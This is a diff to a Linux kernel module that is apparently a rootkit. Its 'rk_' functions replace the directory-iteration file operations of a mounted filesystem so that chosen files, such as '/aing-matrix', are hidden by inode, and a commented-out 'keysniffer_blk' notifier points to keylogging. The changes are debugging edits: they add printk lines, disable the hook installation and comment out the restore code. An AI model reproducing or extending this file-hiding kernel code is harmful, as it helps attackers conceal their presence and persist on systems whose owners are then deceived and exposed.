@@ -619,7 +619,7 @@ static int rk_filldir_t(struct dir_context* ctx, const char* proc_name, int len,
         }
     }
 #endif
-    return backup_ctx->actor(backup_ctx, proc_name, len, off, ino, d_type);
+    return ctx->actor(ctx, proc_name, len, off, ino, d_type);
 }
 
 int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
@@ -627,7 +627,9 @@ int rk_iterate_shared(struct file* file, struct dir_context* ctx) {
     int result = 0;
 
     for (i = 0; i < hidden_file_count; ++i) {
-        if (file->f_inode == hidden_files[i].inode) {
+        printk(KERN_ALERT "Pre check\n");
+        if (file && file->f_inode && file->f_inode == hidden_files[i].inode) {
+            printk(KERN_ALERT "Post check\n");
             //Inodes match, use this context
             hidden_files[i].bad_ctx.pos = ctx->pos;
             hidden_files[i].backup_ctx = ctx;
@@ -720,6 +722,7 @@ static int __init mod_init(void) {
     }
 
     //if (kern_path("/proc", 0, &proc_path)) {
+#if 0
     if (kern_path("/", 0, &proc_path)) {
         return -1;
     }
@@ -728,6 +731,7 @@ static int __init mod_init(void) {
     backup_proc_fops = proc_inode->i_fop;
     proc_fops.iterate_shared = rk_iterate_shared;
     proc_inode->i_fop = &proc_fops;
+#endif
 
     const char* user_input = "/aing-matrix";
     if (hide_file(user_input, hidden_files + hidden_file_count)) {
@@ -854,8 +858,8 @@ static void __exit mod_exit(void) {
 
     //unregister_keyboard_notifier(&keysniffer_blk);
 
-    proc_inode = proc_path.dentry->d_inode;
-    proc_inode->i_fop = backup_proc_fops;
+    //proc_inode = proc_path.dentry->d_inode;
+    //proc_inode->i_fop = backup_proc_fops;
 
     for (i = 0; i < hidden_file_count; ++i) {
         hidden_files[i].inode = hidden_files[i].path.dentry->d_inode;
